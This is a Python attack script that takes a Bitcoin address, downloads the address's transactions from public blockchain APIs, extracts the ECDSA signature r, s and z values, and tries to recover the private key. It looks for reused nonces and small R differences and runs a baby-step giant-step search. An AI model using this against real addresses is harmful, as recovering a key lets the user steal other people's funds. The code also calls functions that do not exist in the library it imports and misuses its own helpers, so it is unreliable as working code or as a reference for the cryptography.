# -*- coding: utf-8 -*-
"""

@author: iceland
"""
import sys
import json
import argparse
from urllib.request import urlopen
# from itertools import combinations
from ecdsa import SECP256k1, SigningKey, VerifyingKey  # alternatif kütüphane

G = SECP256k1.generator
N = SECP256k1.order
ZERO = None  # sıfır noktası (infinity point) - ecdsa'da None olarak temsil edilir
#==============================================================================
parser = argparse.ArgumentParser(description='This tool helps to get ECDSA Signature r,s,z values from Bitcoin Address. Also attempt to solve \
                                 for privatekey using Rvalues successive differencing mathematics using bsgs table in RAM.', 
                                 epilog='Enjoy the program! :)    Tips BTC: bc1q39meky2mn5qjq704zz0nnkl0v7kj4uz6r529at')

parser.add_argument("-a", help = "Address to search for its rsz from the transactions", required="True")

bP = 100000000

if len(sys.argv)==1:
    parser.print_help()
    sys.exit(1)
args = parser.parse_args()

address = args.a if args.a else ''

if address == '': 
    print('One of the required option is missing -a'); sys.exit(1)
#==============================================================================
def get_rs(sig):
    rlen = int(sig[2:4], 16)
    r = sig[4:4+rlen*2]
#    slen = int(sig[6+rlen*2:8+rlen*2], 16)
    s = sig[8+rlen*2:]
    return r, s
#==============================================================================
def split_sig_pieces(script):
    sigLen = int(script[2:4], 16)
    sig = script[2+2:2+sigLen*2]
    r, s = get_rs(sig[4:])
    pubLen = int(script[4+sigLen*2:4+sigLen*2+2], 16)
    pub = script[4+sigLen*2+2:]
    assert(len(pub) == pubLen*2)
    return r, s, pub
#==============================================================================

# Returns list of this list [first, sig, pub, rest] for each input
def parseTx(txn):
    if len(txn) <130:
        print('[WARNING] rawtx most likely incorrect. Please check..')
        sys.exit(1)
    inp_list = []
    ver = txn[:8]
    if txn[8:12] == '0001':
        print('UnSupported Tx Input. Presence of Witness Data')
        sys.exit(1)
    inp_nu = int(txn[8:10], 16)
    
    first = txn[0:10]
    cur = 10
    for m in range(inp_nu):
        prv_out = txn[cur:cur+64]
        var0 = txn[cur+64:cur+64+8]
        cur = cur+64+8
        scriptLen = int(txn[cur:cur+2], 16)
        script = txn[cur:2+cur+2*scriptLen] #8b included
        r, s, pub = split_sig_pieces(script)
        seq = txn[2+cur+2*scriptLen:10+cur+2*scriptLen]
        inp_list.append([prv_out, var0, r, s, pub, seq])
        cur = 10+cur+2*scriptLen
    rest = txn[cur:]
    return [first, inp_list, rest]
#==============================================================================

def get_rawtx_from_blockchain(txid):
    try:
        htmlfile = urlopen("https://blockchain.info/rawtx/%s?format=hex" % txid, timeout = 20)
    except:
        print('Unable to connect internet to fetch RawTx. Exiting..')
        sys.exit(1)
    else: res = htmlfile.read().decode('utf-8')
    return res
#==============================================================================

def getSignableTxn(parsed):
    res = []
    first, inp_list, rest = parsed
    tot = len(inp_list)
    for one in range(tot):
        e = first
        for i in range(tot):
            e += inp_list[i][0] # prev_txid
            e += inp_list[i][1] # var0
            if one == i: 
                e += '1976a914' + HASH160(inp_list[one][4]) + '88ac'
            else:
                e += '00'
            e += inp_list[i][5] # seq
        e += rest + "01000000"
        z = SECP256k1.sha256(SECP256k1.sha256(bytes.fromhex(e))).hex()
        res.append([inp_list[one][2], inp_list[one][3], z, inp_list[one][4], e])
    return res
#==============================================================================
def HASH160(pubk_hex):
    iscompressed = True if len(pubk_hex) < 70 else False
    P = SECP256k1.pubkey_to_point(0, iscompressed, pubk_hex)
    return SECP256k1.pubkey_to_address(P).hex()
#==============================================================================

# def diff_comb(alist):
#     return [SECP256k1.point_subtraction(x, y) for x, y in combinations(alist, 2)]

def diff_comb_idx(alist):
    LL = len(alist)
    RDD = []
    for i in range(LL):
        for j in range(i+1, LL):
            RDD.append((i, j, SECP256k1.point_subtraction(alist[i], alist[j])))
            RDD.append((i, j, SECP256k1.point_addition(alist[i], alist[j])))
#    return [(i, j, SECP256k1.point_subtraction(alist[i], alist[j])) for i in range(LL) for j in range(i+1, LL)]
    return RDD
#==============================================================================
def inv(a):
    return pow(a, N - 2, N)

def calc_RQ(r, s, z, pub_point):
    # r, s, z in int format and pub_point in upub bytes
    RP1 = SECP256k1.pubkey_to_point('02' + hex(r)[2:].zfill(64))
    RP2 = SECP256k1.pubkey_to_point('03' + hex(r)[2:].zfill(64))
    sdr = (s * inv(r)) % N
    zdr = (z * inv(r)) % N
    FF1 = SECP256k1.point_subtraction( SECP256k1.point_multiplication(RP1, sdr),
                                SECP256k1.scalar_multiplication(zdr) )
    FF2 = SECP256k1.point_subtraction( SECP256k1.point_multiplication(RP2, sdr),
                                SECP256k1.scalar_multiplication(zdr) )
    if FF1 == pub_point: 
        print('========  RSZ to PubKey Validation [SUCCESS]  ========')
        return RP1
    if FF2 == pub_point: 
        print('========  RSZ to PubKey Validation [SUCCESS]  ========')
        return RP2
    return '========  RSZ to PubKey Validation [FAIL]  ========'

def getk1(r1, s1, z1, r2, s2, z2, m):
    nr = (s2 * m * r1 + z1 * r2 - z2 * r1) % N
    dr = (s1 * r2 - s2 * r1) % N
    return (nr * inv(dr)) % N


def getpvk(r1, s1, z1, r2, s2, z2, m):
    x1 = (s2 * z1 - s1 * z2 + m * s1 * s2) % N
    xi = inv((s1 * r2 - s2 * r1) % N)
    x = (x1 * xi) % N
    return x

def all_pvk_candidate(r1, s1, z1, r2, s2, z2, m):
    xi = []
    xi.append( getpvk(r1, s1, z1, r2, s2, z2, m) )
    xi.append( getpvk(r1, -s1%N, z1, r2, s2, z2, m) )
    xi.append( getpvk(r1, -s1%N, z1, r2, -s2%N, z2, m) )
    xi.append( getpvk(r1, s1, z1, r2, -s2%N, z2, m) )
    return xi
#==============================================================================
def check_tx(address):
    txid = []
    cdx = []
    ccount = 0
    try:
        htmlfile = urlopen(f'https://mempool.space/api/address/{address}/txs/chain', timeout = 20)
    except:
        print('Unable to connect internet to fetch RawTx. Exiting..')
        sys.exit(1)
    else: 
        while True:
            # current single fetch limit = 25. Loop added for getting all Tx.
            res = json.loads(htmlfile.read())
            txcount = len(res)
            if txcount == 0:
                break
            ccount += txcount
            lasttxid = res[-1]['txid']
            print(f'Reading: Tx {ccount-txcount}:{ccount} Input/Output Transactions from the Address: {address}')
            for i in range(txcount):
                vin_cnt = len(res[i]["vin"])
                for j in range(vin_cnt):
                    try:
                        if res[i]["vin"][j]["prevout"].get("scriptpubkey_address") == address:
                            txid.append(res[i]["txid"])
                            cdx.append(j)
                    except (KeyError, TypeError):
                        continue
            try:
                htmlfile = urlopen(f'https://mempool.space/api/address/{address}/txs/chain/{lasttxid}', timeout = 20)
            except:
                print('Unable to connect internet to fetch more RawTx. continuing...')
                break
    return txid, cdx
#==============================================================================

def bsgs_2nd_check_prepare(P=None, Q=None, n=100000000):
    """Baby-Step Giant-Step tablosu hazırla"""
    global BSGS_TABLE
    BSGS_TABLE = {}
    N = SECP256k1.order
    m = int(n ** 0.5) + 1  # Optimal değer
    
    # Baby steps
    for j in range(m):
        # jP hesapla ve tabloya ekle
        BSGS_TABLE[j] = SECP256k1.scalar_multiplication(j)
    
    return m

def bsgs_2nd_check(P, Q, n=100000000):
    """BSGS ile private key ara"""
    if not hasattr(SECP256k1, 'BSGS_TABLE'):
        m = bsgs_2nd_check_prepare(P, Q, n)
    else:
        m = int(n ** 0.5) + 1
        
    N = SECP256k1.order
    
    # Giant steps
    for i in range(m):
        # Q - imP hesapla
        R = SECP256k1.point_subtraction(Q, SECP256k1.scalar_multiplication(i * m))
        
        # Tabloda ara
        if R in BSGS_TABLE:
            j = BSGS_TABLE[R]
            x = i * m + j
            if x < N:  # Private key N'den küçük olmalı
                return True, hex(x)
    
    return False, None

def analyze_r_values(rL, sL, zL, QL, txid):
    """R değerlerini analiz et"""
    # Duplicate R kontrolü
    r_values = {}
    for i, r in enumerate(rL):
        r_hex = hex(r)[2:]
        if r_hex in r_values:
            print(f"\nDuplicate R bulundu!")
            print(f"TX1: {txid[r_values[r_hex]]}")
            print(f"TX2: {txid[i]}")
            try:
                k = (zL[i] - zL[r_values[r_hex]]) * inv(sL[i] - sL[r_values[r_hex]], N) % N
                priv = (sL[i] * k - zL[i]) * inv(rL[i], N) % N
                print(f"Private key: {hex(priv)}")
            except:
                print("Private key hesaplanamadı")
        else:
            r_values[r_hex] = i

    # R değerleri arasındaki farkları kontrol et
    for i in range(len(rL)):
        for j in range(i+1, len(rL)):
            diff = abs((rL[i] - rL[j]) % N)
            if 0 < diff < 1000000:
                print(f"\nKüçük R farkı bulundu!")
                print(f"TX1: {txid[i]}")
                print(f"TX2: {txid[j]}")
                print(f"Fark: {diff}")

def main():
    print('\nStarting Program...')
    print('-'*120)
    
    txid, cdx = check_tx(address)
    d = set([txid[i] +'BS'+ str(cdx[i]) for i in range(len(txid))])
    txid = [line.split('BS')[0] for line in d]
    cdx = [int(line.split('BS')[1]) for line in d]
    print(f'Total {len(txid)} outgoing unique Tx fetched from the Address {address}')

    RQ, rL, sL, zL, QL = [], [], [], [], []

    for c in range(len(txid)):
        rawtx = get_rawtx_from_blockchain(txid[c])
        try:
            m = parseTx(rawtx)
            e = getSignableTxn(m)
            for i in range(len(e)):
                if i == cdx[c]:
                    rL.append(int(e[i][0], 16))
                    sL.append(int(e[i][1], 16))
                    zL.append(int(e[i][2], 16))
                    QL.append(SECP256k1.pubkey_to_point(e[i][3]))
                    print('='*70,f'\n[Input Index #: {i}] [txid: {txid[c]}]\n     R: {e[i][0]}\n     S: {e[i][1]}\n     Z: {e[i][2]}\nPubKey: {e[i][3]}')
        except Exception as e:
            print(f'Skipped the Tx [{txid[c]}]........')
            continue

    print('='*70)
    print('-'*120)

    # R değerlerini analiz et
    if len(rL) > 0:
        analyze_r_values(rL, sL, zL, QL, txid)

if __name__ == "__main__":
    main()
